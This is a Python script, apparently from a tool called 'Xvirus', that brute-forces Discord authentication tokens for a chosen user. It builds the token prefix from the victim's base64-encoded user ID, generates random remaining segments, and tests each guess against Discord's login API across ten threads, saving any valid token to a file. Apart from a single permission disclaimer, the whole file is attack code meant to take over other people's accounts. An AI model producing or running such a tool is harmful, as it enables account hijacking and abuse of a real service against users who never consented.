import base64
import random
import string
import threading
import requests
import os

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def spammer():
    if not os.path.exists('token-brute.txt'):
        with open('token-brute.txt', 'w') as f:
            pass
    print("Xvirus token brute-force. PS: This might take a long time to work.")
    print("If you are extremely lucky and able to get someone's token, you will find it in brute-force.txt")
    print('''Do not do this without the permission of the person to whom the brute force attack is conducted.''')

    id_to_token = base64.b64encode((input("Id of user: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruteforce():
        while True:
            token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ''.join(
                random.choices(string.ascii_letters + string.digits, k=25))
            headers = {'Authorization': token}
            login = requests.get('https://discord.com/api/v10/auth/login', headers=headers)
            try:
                if login.status_code == 200:
                    print('[+] VALID' + ' ' + token)
                    with open('brute-force.txt', "a+") as f:
                        f.write(f'{token}\n')
                else:
                    print('[-] INVALID' + ' ' + token)
            except Exception as e:
                print('Error:', e)
            finally:
                print('')

    def start_threads():
        for _ in range(10):
            threading.Thread(target=bruteforce).start()

    start_threads()

spammer()
